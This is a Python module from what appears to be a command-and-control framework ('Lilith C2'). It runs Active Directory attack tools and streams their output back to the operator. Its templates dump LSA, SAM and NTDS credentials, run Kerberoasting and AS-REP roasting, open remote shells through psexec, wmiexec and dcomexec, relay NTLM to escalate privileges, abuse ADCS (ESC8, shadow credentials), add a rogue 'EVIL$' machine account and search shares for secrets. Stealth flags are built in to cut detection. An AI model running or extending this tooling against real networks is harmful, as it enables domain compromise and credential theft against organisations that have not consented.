"""
lateral.py — AD tool runner integrated into Lilith C2.

Tools run on the attacker box (server-side). Output is streamed via SSE.
No binaries touch target disk. Auth can come from session cred store.
"""
from __future__ import annotations
import os, shutil, subprocess, threading, time, secrets
from typing import Callable

# ── Tool discovery ─────────────────────────────────────────────────────────────

def _find(*names: str) -> str | None:
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None

LOCAL_BIN = os.path.expanduser("~/.local/bin")

TOOLS: dict[str, str | None] = {
    # nxc / crackmapexec
    "nxc":          _find("nxc", "crackmapexec"),
    # certipy
    "certipy":      _find("certipy", "certipy-ad"),
    # impacket scripts
    "secretsdump":  _find("impacket-secretsdump", "secretsdump.py",
                          f"{LOCAL_BIN}/secretsdump.py"),
    "GetUserSPNs":  _find("impacket-GetUserSPNs",  "GetUserSPNs.py",
                          f"{LOCAL_BIN}/GetUserSPNs.py"),
    "GetNPUsers":   _find("impacket-GetNPUsers",   "GetNPUsers.py",
                          f"{LOCAL_BIN}/GetNPUsers.py"),
    "psexec":       _find("impacket-psexec",       "psexec.py",
                          f"{LOCAL_BIN}/psexec.py"),
    "wmiexec":      _find("impacket-wmiexec",      "wmiexec.py",
                          f"{LOCAL_BIN}/wmiexec.py"),
    "atexec":       _find("impacket-atexec",       "atexec.py",
                          f"{LOCAL_BIN}/atexec.py"),
    "dcomexec":     _find("impacket-dcomexec",     "dcomexec.py",
                          f"{LOCAL_BIN}/dcomexec.py"),
    "ntlmrelayx":   _find("impacket-ntlmrelayx",   "ntlmrelayx.py",
                          f"{LOCAL_BIN}/ntlmrelayx.py"),
    "lookupsid":    _find("impacket-lookupsid",    "lookupsid.py",
                          f"{LOCAL_BIN}/lookupsid.py"),
    "smbclient":    _find("impacket-smbclient",    "smbclient.py",
                          f"{LOCAL_BIN}/smbclient.py"),
    "ticketer":     _find("impacket-ticketer",     "ticketer.py",
                          f"{LOCAL_BIN}/ticketer.py"),
    "reg":          _find("impacket-reg",          "reg.py",
                          f"{LOCAL_BIN}/reg.py"),
    "addcomputer":  _find("impacket-addcomputer",  "addcomputer.py",
                          f"{LOCAL_BIN}/addcomputer.py"),
    "changepasswd": _find("impacket-changepasswd", "changepasswd.py",
                          f"{LOCAL_BIN}/changepasswd.py"),
    # bloodhound
    "bloodhound":   _find("bloodhound-python", "bloodhound"),
    # misc
    "rpcclient":    _find("rpcclient"),
    "ldapsearch":   _find("ldapsearch"),
    "kinit":        _find("kinit"),
}

# ── OPSEC/stealth extra flags per tool ─────────────────────────────────────────
# These are appended when stealth=True. They slow queries and reduce noise.
_STEALTH_FLAGS: dict[str, list[str]] = {
    "nxc":         ["--timeout", "15", "--jitter", "1"],
    "certipy":     ["-timeout", "10", "-delay", "1", "-scheme", "ldaps"],
    "GetUserSPNs": ["-request-user", ""],   # patched out at build time
    "GetNPUsers":  [],
    "bloodhound":  ["--dns-timeout", "5", "--zip"],
}

# ── Active process registry ────────────────────────────────────────────────────
_procs: dict[str, subprocess.Popen] = {}
_lock  = threading.Lock()


def tool_status() -> dict[str, dict]:
    """Return {tool: {available, path}} for every supported tool."""
    return {t: {"available": bool(p), "path": p or ""} for t, p in TOOLS.items()}


def run_tool(
    run_id: str,
    tool: str,
    args: list[str],
    stealth: bool,
    publish: Callable[[dict], None],
    extra_env: dict | None = None,
) -> None:
    """
    Spawn the tool as a subprocess and stream each output line as an SSE event.
    Non-blocking — returns immediately; the thread does the work.
    """
    bin_path = TOOLS.get(tool)
    if not bin_path:
        publish({"type": "lat_line", "id": run_id,
                 "line": f"[!] tool not found: {tool}", "done": True, "rc": 127})
        return

    cmd = _build_cmd(bin_path, tool, args, stealth)
    publish({"type": "lat_start", "id": run_id,
             "cmd": " ".join(cmd[:8]) + ("…" if len(cmd) > 8 else "")})

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    # suppress impacket's "checking credentials" prompt confusion
    env.setdefault("KRB5CCNAME", env.get("KRB5CCNAME", ""))
    if extra_env:
        env.update(extra_env)

    def _worker():
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                env=env,
                bufsize=1,
            )
            with _lock:
                _procs[run_id] = proc
            for raw in proc.stdout:
                line = raw.rstrip()
                if line:
                    publish({"type": "lat_line", "id": run_id, "line": line})
            proc.wait()
            with _lock:
                _procs.pop(run_id, None)
            publish({"type": "lat_line", "id": run_id,
                     "line": f"\n[*] process exited ({proc.returncode})",
                     "done": True, "rc": proc.returncode})
        except Exception as ex:
            with _lock:
                _procs.pop(run_id, None)
            publish({"type": "lat_line", "id": run_id,
                     "line": f"[!] runner error: {ex}", "done": True, "rc": -1})

    threading.Thread(target=_worker, daemon=True, name=f"lat-{run_id[:8]}").start()


def kill_run(run_id: str) -> bool:
    with _lock:
        proc = _procs.get(run_id)
    if not proc:
        return False
    try:
        proc.terminate()
    except Exception:
        pass
    return True


def active_runs() -> list[str]:
    with _lock:
        return list(_procs.keys())


# ── Command builder ────────────────────────────────────────────────────────────

def _build_cmd(bin_path: str, tool: str, args: list[str], stealth: bool) -> list[str]:
    """Build the final argv list, including stealth flags when requested."""
    # .py scripts need python3
    if bin_path.endswith(".py"):
        cmd = ["python3", bin_path] + args
    else:
        cmd = [bin_path] + args

    if stealth and tool in _STEALTH_FLAGS:
        flags = _STEALTH_FLAGS[tool]
        # only append flags that aren't already present
        for f in flags:
            if f and f not in args:
                cmd.append(f)

    return cmd


# ── Pre-built command templates ────────────────────────────────────────────────
# Each entry: {id, label, tool, build(params) → list[str], stealth_default}
# params keys used: target, domain, user, password, hash, dc_ip, extra

def _auth(p: dict) -> list[str]:
    """Build nxc-style auth fragment from cred params."""
    out = []
    if p.get("user"):
        out += ["-u", p["user"]]
    if p.get("hash"):
        out += ["-H", p["hash"]]
    elif p.get("password"):
        out += ["-p", p["password"]]
    if p.get("domain"):
        out += ["-d", p["domain"]]
    if p.get("kerberos"):
        out += ["-k", "--use-kcache"]
    return out


def _imp_auth(p: dict) -> str:
    """Build impacket-style DOMAIN/user:pass@target string."""
    dom  = p.get("domain", ".")
    user = p.get("user", "")
    pw   = p.get("password", "")
    h    = p.get("hash", "")
    tgt  = p.get("target", "")
    cred = f"{dom}/{user}"
    if h:
        cred += f":{h}@{tgt}" if h else f"@{tgt}"
    else:
        cred += f":{pw}@{tgt}"
    return cred


TEMPLATES: list[dict] = [
    # ── NXC ────────────────────────────────────────────────────────────────
    {"id": "nxc_smb_auth",    "label": "SMB — auth check",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p)},

    {"id": "nxc_smb_shares",  "label": "SMB — enum shares",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--shares"]},

    {"id": "nxc_smb_users",   "label": "SMB — enum users",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--users"]},

    {"id": "nxc_smb_groups",  "label": "SMB — enum groups",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--groups"]},

    {"id": "nxc_smb_lsa",     "label": "SMB — LSA dump",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--lsa"]},

    {"id": "nxc_smb_sam",     "label": "SMB — SAM dump",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--sam"]},

    {"id": "nxc_smb_rid",     "label": "SMB — RID brute (users)",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--rid-brute"]},

    {"id": "nxc_smb_exec",    "label": "SMB — exec command",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["-x", p.get("extra", "whoami")]},

    {"id": "nxc_smb_spider",  "label": "SMB — spider shares",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--spider", "C$", "--pattern", "pass|cred|secret|key"]},

    {"id": "nxc_ldap_auth",   "label": "LDAP — auth check",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["ldap", p["target"]] + _auth(p)},

    {"id": "nxc_ldap_bloodhound", "label": "LDAP — BloodHound collect",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["ldap", p["target"]] + _auth(p) + ["--bloodhound", "-c", "all"]},

    {"id": "nxc_ldap_asreproast", "label": "LDAP — AS-REP roast",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["ldap", p["target"]] + _auth(p) + ["--asreproast", "/dev/stdout"]},

    {"id": "nxc_ldap_kerberoast", "label": "LDAP — Kerberoast",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["ldap", p["target"]] + _auth(p) + ["--kerberoasting", "/dev/stdout"]},

    {"id": "nxc_smb_pass_pol", "label": "SMB — password policy",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["smb", p["target"]] + _auth(p) + ["--pass-pol"]},

    {"id": "nxc_rdp",         "label": "RDP — auth check",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["rdp", p["target"]] + _auth(p)},

    {"id": "nxc_winrm",       "label": "WinRM — auth check",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["winrm", p["target"]] + _auth(p)},

    {"id": "nxc_mssql",       "label": "MSSQL — auth check",
     "tool": "nxc", "category": "NXC",
     "build": lambda p: ["mssql", p["target"]] + _auth(p)},

    # ── CERTIPY ────────────────────────────────────────────────────────────
    {"id": "cert_find",       "label": "ADCS — find vuln templates",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["find",
         "-u", f"{p['user']}@{p['domain']}",
         "-p", p.get("password", ""),
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-vulnerable", "-stdout"]},

    {"id": "cert_find_json",  "label": "ADCS — find all (JSON)",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["find",
         "-u", f"{p['user']}@{p['domain']}",
         "-p", p.get("password", ""),
         "-dc-ip", p.get("dc_ip", p["target"])]},

    {"id": "cert_req",        "label": "ADCS — request cert",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["req",
         "-u", f"{p['user']}@{p['domain']}",
         "-p", p.get("password", ""),
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-ca",    p.get("extra", "CA"),
         "-template", "User"]},

    {"id": "cert_auth",       "label": "ADCS — auth via cert (PKINIT)",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["auth",
         "-pfx", p.get("extra", "cert.pfx"),
         "-dc-ip", p.get("dc_ip", p["target"])]},

    {"id": "cert_shadow",     "label": "ADCS — shadow credentials",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["shadow", "auto",
         "-u", f"{p['user']}@{p['domain']}",
         "-p", p.get("password", ""),
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-account", p.get("extra", "")]},

    {"id": "cert_relay",      "label": "ADCS — ESC8 relay setup",
     "tool": "certipy", "category": "CERTIPY",
     "build": lambda p: ["relay",
         "-ca", p.get("extra", ""),
         "-template", "DomainController"]},

    # ── IMPACKET ───────────────────────────────────────────────────────────
    {"id": "imp_secretsdump", "label": "secretsdump — dump NTDS/SAM",
     "tool": "secretsdump", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p),
         "-dc-ip", p.get("dc_ip", p["target"])]},

    {"id": "imp_secretsdump_ntds", "label": "secretsdump — NTDS via DRSUAPI",
     "tool": "secretsdump", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p),
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-just-dc-ntlm"]},

    {"id": "imp_getuserspns", "label": "GetUserSPNs — Kerberoast",
     "tool": "GetUserSPNs", "category": "IMPACKET",
     "build": lambda p: [f"{p.get('domain','.')}/{p.get('user','')}:{p.get('password','')}",
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-request", "-outputfile", "/tmp/kerberoast.txt"]},

    {"id": "imp_getnpusers",  "label": "GetNPUsers — AS-REP roast",
     "tool": "GetNPUsers", "category": "IMPACKET",
     "build": lambda p: [f"{p.get('domain','.')}/{p.get('user','')}",
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-no-pass", "-format", "hashcat"]},

    {"id": "imp_psexec",      "label": "psexec — shell",
     "tool": "psexec", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p)]},

    {"id": "imp_wmiexec",     "label": "wmiexec — shell",
     "tool": "wmiexec", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p)]},

    {"id": "imp_atexec",      "label": "atexec — Task Scheduler exec",
     "tool": "atexec", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p), p.get("extra", "whoami")]},

    {"id": "imp_dcomexec",    "label": "dcomexec — DCOM exec",
     "tool": "dcomexec", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p), p.get("extra", "whoami")]},

    {"id": "imp_lookupsid",   "label": "lookupsid — RID brute (null)",
     "tool": "lookupsid", "category": "IMPACKET",
     "build": lambda p: [f"{p.get('domain','.')}/{p.get('user','')}:{p.get('password','')}@{p['target']}"]},

    {"id": "imp_smbclient",   "label": "smbclient — browse shares",
     "tool": "smbclient", "category": "IMPACKET",
     "build": lambda p: [_imp_auth(p)]},

    {"id": "imp_ntlmrelayx",  "label": "ntlmrelayx — relay to LDAP",
     "tool": "ntlmrelayx", "category": "IMPACKET",
     "build": lambda p: ["-t", f"ldap://{p.get('dc_ip', p['target'])}",
         "--escalate-user", p.get("extra", ""),
         "-smb2support"]},

    {"id": "imp_addcomputer", "label": "addcomputer — MachineAccount add",
     "tool": "addcomputer", "category": "IMPACKET",
     "build": lambda p: [f"{p.get('domain','.')}/{p.get('user','')}:{p.get('password','')}",
         "-dc-ip", p.get("dc_ip", p["target"]),
         "-computer-name", p.get("extra", "EVIL$"),
         "-computer-pass", "Passw0rd!"]},

    # ── BLOODHOUND ─────────────────────────────────────────────────────────
    {"id": "bh_collect_all",  "label": "BloodHound — collect all",
     "tool": "bloodhound", "category": "BLOODHOUND",
     "build": lambda p: ["-c", "All",
         "-u", p.get("user", ""),
         "-p", p.get("password", ""),
         "-d", p.get("domain", ""),
         "--dc", p.get("dc_ip", p["target"]),
         "-ns", p.get("dc_ip", p["target"]),
         "--zip"]},

    {"id": "bh_collect_dc",   "label": "BloodHound — DC only (stealthy)",
     "tool": "bloodhound", "category": "BLOODHOUND",
     "build": lambda p: ["-c", "DCOnly",
         "-u", p.get("user", ""),
         "-p", p.get("password", ""),
         "-d", p.get("domain", ""),
         "--dc", p.get("dc_ip", p["target"]),
         "-ns", p.get("dc_ip", p["target"]),
         "--zip"]},
]

TEMPLATE_MAP: dict[str, dict] = {t["id"]: t for t in TEMPLATES}
CATEGORIES = sorted({t["category"] for t in TEMPLATES})
